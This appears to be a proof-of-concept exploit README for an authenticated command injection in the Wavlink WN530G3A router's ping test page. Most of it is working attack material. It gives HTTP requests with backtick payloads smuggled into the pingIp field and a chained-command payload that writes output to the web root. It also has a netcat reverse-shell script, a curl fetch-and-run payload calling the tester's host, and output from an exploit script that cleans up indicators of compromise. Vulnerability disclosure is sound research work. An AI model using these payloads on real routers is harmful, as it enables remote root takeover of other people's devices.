# Wavlink-WN530G3A-Cmd-Injection
This repo details the proof of concept exploit code for the Wavlink WN530G3 router

# Command Injection in Wavlink WN530G3A
- Model QUANTUM D2G/WL-WN530G3A
- You may browse all firmware for this model router from this url: https://docs.wavlink.xyz/Firmware/fm-530g3a/
- You may obtain a copy of the firmware from this url: https://files2.wavlink.com/drivers/fw/WN530G3A_20230616_WAVLINK_M30G3_V230616.bin
- This is an authenticated command injection vulnerability, valid credentials are required to exploit this vulnerability.
- Exploit tested and verifed on firmware: `WN530G3A_20230616_WAVLINK_M30G3_V230616.bin` (located in this repo)
## Manual Exploitation
- Navigate to the router URL, my example device is running on `127.0.0.1`
- Provide the valid password in order to login to the device
- After authenticating you will be directed to `/main.shtml`
- Select the Gear icon that states `Setup` on the bottom right of the displayed page
- Look for the `Ping Test` option, and select it
- A Page will be displayed allowing you to ping a local or remote host. This page is where the authenticated command injection vulnerability is.
- To manually verify this vulnerability ensure Burp Suite is running and you capture a request to ping 127.0.0.1 or another ip of your choosing.
## A Normal Request (No Injection)
````
POST /cgi-bin/adm.cgi HTTP/1.1
Host: 127.0.0.1
Content-Length: 54
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: iframe
Referer: http://127.0.0.1/ping.shtml?r=47439
Accept-Encoding: gzip, deflate, br
Cookie: session=1920444770
Connection: keep-alive

page=ping_test&CCMD=5&pingIp=127.0.0.1
````
- Above is what a normal ping request looks like when 127.0.0.1 is the selected target ip address.
- The router will ping the target 5 times
## A Normal Response (No Injection)
- This is what a normal non injected response looks like
````
HTTP/1.1 200 OK
Content-Length: 35
Date: Mon, 11 Aug 2025 19:44:13 GMT
Server: lighttpd

pingIp = 127.0.0.1
````
## Cmd Injection
- This is the a basic payload for the command injection
````
POST /cgi-bin/adm.cgi HTTP/1.1
Host: 127.0.0.1
Content-Length: 54
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: iframe
Referer: http://127.0.0.1/ping.shtml?r=47439
Accept-Encoding: gzip, deflate, br
Cookie: session=1920444770
Connection: keep-alive

page=ping_test&CCMD=5&pingIp=127.0.0.1`ls>/tmp/ls.out`
````
- This will run the `ls` binary on target and dump the results out to `/tmp/ls.out`
## A Successful Injection Response
- This is the output when the injection was successful. You will see the command run reflected back to you in Burp Suite
````
HTTP/1.1 200 OK
Content-Length: 35
Date: Mon, 11 Aug 2025 19:44:13 GMT
Server: lighttpd

pingIp = 127.0.0.1`ls>/tmp/ls.out`
````
- When a payload is run this is what it looks like in the process list
````
21330 rootws    1224 S    /etc/lighttpd/www/cgi-bin/adm.cgi
21333 rootws    1296 S    sh -c ping "127.0.0.1`ps>/tmp/ps.out`" -W 1 -c 5 > /
21334 rootws    1296 R    ps
````
## Better Payloads
- We can certainly make a better payload than this!
- Lets take it a step further and have a way to remotely retrieve the command output. Additionally lets find a way to run multiple commands at a time!
````
# request payload
page=ping_test&CCMD=1&pingIp=127.0.0.1`(id; uname -a; ps)>/etc/lighttpd/www/diag.txt`

# response payload
pingIp = 127.0.0.1`(id; uname -a; ps)>/etc/lighttpd/www/diag.txt`
````
- Now we can simply curl to see the command output.
````
curl http://127.0.0.1/diag.txt
uid=0(rootws) gid=0(root) groups=0(root),10
Linux MIPSX 2.6.32.5 #9 Tue Dec 21 03:19:53 IST 2021 mips GNU/Linux
  PID USER       VSZ STAT COMMAND
    1 rootws    1936 S    init
    2 rootws       0 SW   [kthreadd]
    3 rootws       0 SW   [ksoftirqd/0]
--snip--
23658 rootws    1224 S    /etc/lighttpd/www/cgi-bin/adm.cgi
23661 rootws    1296 S    sh -c ping "127.0.0.1`(id; uname -a; ps)>/etc/lightt
23662 rootws    1296 R    ps
31930 rootws    1308 S    /usr/sbin/dropbear -p 22222 -R
31932 rootws    1948 S    -sh
````
- By using `curl` to retrieve our cmd output and by utilizing `()` we can chain together a whole string of commands!
## Reverse shell
- Lets achieve the holy grail in exploitation, the reverse shell.
- We will utilize `curl` to grab a hosted reverse shell script and execute it.
- Lets get our listener set up
````
# My local machine
EMUX HOSTFS [WN530G3]:~> ifconfig
eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  
          inet addr:192.168.100.2  Bcast:192.168.100.255  Mask:255.255.255.0
          inet6 addr: fe80::5054:ff:fe12:3456/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:777252 errors:10 dropped:26 overruns:0 frame:0
          TX packets:776983 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:249303225 (237.7 MiB)  TX bytes:131854881 (125.7 MiB)
          Interrupt:11 Base address:0x1020 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:15740 errors:0 dropped:0 overruns:0 frame:0
          TX packets:15740 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1247888 (1.1 MiB)  TX bytes:1247888 (1.1 MiB)

EMUX HOSTFS [WN530G3]:~> nc -nlvp 8888
````
- Start webserver on my local machine
````
# My local machine
python3 -m http.server
````
- Create the payload script
````
#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.100.2 8888 >/tmp/f
````
- burp suite payload final
````
POST /cgi-bin/adm.cgi HTTP/1.1
Host: 127.0.0.1
Content-Length: 138
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: iframe
Referer: http://127.0.0.1/ping.shtml?r=28401
Accept-Encoding: gzip, deflate, br
Cookie: session=1317439536
Connection: keep-alive

page=ping_test&CCMD=1&pingIp=127.0.0.1`(curl http://192.168.100.2:8000/shell.sh -o /tmp/shell.sh; chmod 777 /tmp/shell.sh; /tmp/shell.sh)`
````
- This payload will yield us a reverse shell on the target
````
EMUX HOSTFS [WN530G3]:~> nc -nlvp 8888
Connection from 192.168.100.2:33580


sh: can't access tty; job control turned off
BusyBox v1.29.3 () built-in shell (ash)

/etc/lighttpd/www/cgi-bin # ls
ExportAllSettings.cgi
adm.cgi
applogin.cgi
ddns.cgi
firewall.cgi
login.cgi
nas.cgi
nightled.cgi
openvpn.cgi
qos.cgi
staticlist.cgi
upload.cgi
uploadVpn.cgi
upload_settings.cgi
wireless.cgi
/etc/lighttpd/www/cgi-bin # ps
  PID USER       VSZ STAT COMMAND
    1 rootws    1936 S    init
    2 rootws       0 SW   [kthreadd]
    3 rootws       0 SW   [ksoftirqd/0]
    4 rootws       0 SW   [events/0]
    5 rootws       0 SW   [khelper]
    8 rootws       0 SW   [async/mgr]
  102 rootws       0 SW   [sync_supers]
````
## Auto Exploitation
- Use the `exploit.py` script contained in this repo.
- The exploit script will run user provided commands on the target router. It will then display the output of those commands. Afterwards it will clean up the file created on target.
````
python3 exploit.py -u http://127.0.0.1 -p adminadmin -s "id; ls; ps"
[+] Target is up...
[+] Authentication successful, got session id:
        session=489603400; Path=/
[+] Attempting to inject target
[+] Attempting to retrieve command output: 
uid=0(rootws) gid=0(root) groups=0(root),10
ExportAllSettings.cgi
adm.cgi
applogin.cgi
ddns.cgi
firewall.cgi
login.cgi
nas.cgi
nightled.cgi
openvpn.cgi
qos.cgi
staticlist.cgi
upload.cgi
uploadVpn.cgi
upload_settings.cgi
wireless.cgi
  PID USER       VSZ STAT COMMAND
    1 rootws    1936 S    init
    2 rootws       0 SW   [kthreadd]
    3 rootws       0 SW   [ksoftirqd/0]
    4 rootws       0 SW   [events/0]
    5 rootws       0 SW   [khelper]
    8 rootws       0 SW   [async/mgr]
  102 rootws       0 SW   [sync_supers]
  104 rootws       0 SW   [bdi-default]
  105 rootws       0 SW   [kblockd/0]
  113 rootws       0 SW   [kseriod]
  138 rootws       0 SW   [rpciod/0]
  149 rootws       0 SW   [kswapd0]
  150 rootws       0 SW   [aio/0]
  151 rootws       0 SW   [nfsiod]
  153 rootws       0 SW   [crypto/0]
  335 rootws       0 SW   [scsi_tgtd/0]
  341 rootws       0 SW   [mtdblockd]
  378 rootws    1928 S    /sbin/syslogd -n
  382 rootws    1924 S    /sbin/klogd -n
  398 rootws    6952 S    /usr/sbin/haveged -w 1024 -r 0
  405 rootws    1024 S    dcron -L /dev/null
  411 rootws    1284 S    /usr/sbin/dropbear -p 22222 -R
  422 rootws    1052 S    /sbin/agetty -p -L ttyS0 115200 vt100
  423 rootws    1308 S    /usr/sbin/dropbear -p 22222 -R
  424 rootws    1944 S    -sh
  444 rootws    3552 S    {run-init} /bin/bash ./run-init
  460 rootws    1296 S    /bin/sh /.emux/emuxinit
  864 rootws    1296 S    /bin/sh /usr/sbin/check_wan_status.sh
  928 rootws    1308 S    /usr/sbin/dropbear -p 22222 -R
  933 rootws    1944 S    -sh
  992 rootws    1308 S    /bin/sh /bin/curl.sh
 1015 rootws    1412 S    /sbin/procd
 1017 rootws       0 Z    [procd]
 1069 rootws    3548 S    {run-binsh} /bin/bash ./run-binsh
 1081 rootws    1296 S    /bin/sh /.emux/emuxshell
 1082 rootws    1308 S    /bin/sh
 9369 rootws    1300 S    /bin/sh /usr/sbin/check_dnsmasq.sh
 9388 rootws    1304 S    /bin/sh /usr/sbin/check_network_status.sh
 9416 rootws    5800 S    /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf
10150 rootws    1308 S    /usr/sbin/dropbear -p 22222 -R
10151 rootws    1944 S    -sh
10246 rootws    1308 S    /usr/sbin/dropbear -p 22222 -R
10252 rootws    1952 S    -sh
11466 rootws       0 SW   [flush-0:13]
12393 rootws    1932 S    /bin/sh -c sleep 30; /root/test-eth0.sh >/dev/null 2
12394 rootws    1932 S    /bin/sh -c sleep 40; /root/test-eth0.sh >/dev/null 2
12395 rootws    1932 S    /bin/sh -c sleep 50; /root/test-eth0.sh >/dev/null 2
12397 rootws    1924 S    sleep 40
12398 rootws    1924 S    sleep 50
12402 rootws    1924 S    sleep 30
12431 rootws    1296 S    sleep 30
12533 rootws    1296 S    sleep 5
12540 rootws    1296 S    sleep 5
12545 rootws    1296 S    sleep 2
12567 rootws    1224 S    /etc/lighttpd/www/cgi-bin/adm.cgi
12570 rootws    1296 S    sh -c ping "127.0.0.1`(/bin/sh -c 'id; ls; ps' >> /e
12571 rootws    1296 R    ps
19715 rootws    4312 S    socat -v TCP-LISTEN:8000,reuseaddr,fork TCP:172.29.1
22213 rootws    1032 S    nc -nlvp 8888
22742 rootws    1224 S    /etc/lighttpd/www/cgi-bin/adm.cgi
22745 rootws    1296 S    sh -c ping "127.0.0.1`(curl http://192.168.100.2:800
22746 rootws    1296 S    /bin/sh /tmp/shell.sh
22752 rootws    1296 S    cat /tmp/f
22753 rootws    1296 S    sh -i
22754 rootws    1296 S    nc 192.168.100.2 8888

[+] Attempting to clean IOCs left from inject
````


